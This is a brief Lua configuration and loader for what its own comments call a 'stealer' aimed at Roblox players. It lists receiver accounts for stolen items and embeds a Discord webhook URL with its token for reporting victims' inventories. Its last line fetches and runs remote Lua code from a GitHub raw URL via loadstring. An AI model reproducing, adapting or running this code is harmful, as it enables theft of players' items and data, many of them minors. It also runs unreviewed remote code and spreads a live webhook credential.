Config = {
    Receivers = {"ErrorClient04", "ninjasit"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
    Webhook = "https://discord.com/api/webhooks/1265971660759240808/SlH8qsSeVnrxWj63UyF-Po2yP5SM8Zb0TtFdKGQLyRRb-Eh94s9hzMS56e5MYZms7Hh_",
    FullInventory = true, -- If true, it will display all of the player's items.
    GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
    ResendTrade = "Hi", -- Send this in chat to resend the trade request if you don't receive it.
    Script = "Lite", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/Arayangsakitngakingdamdamin.lua",true))()
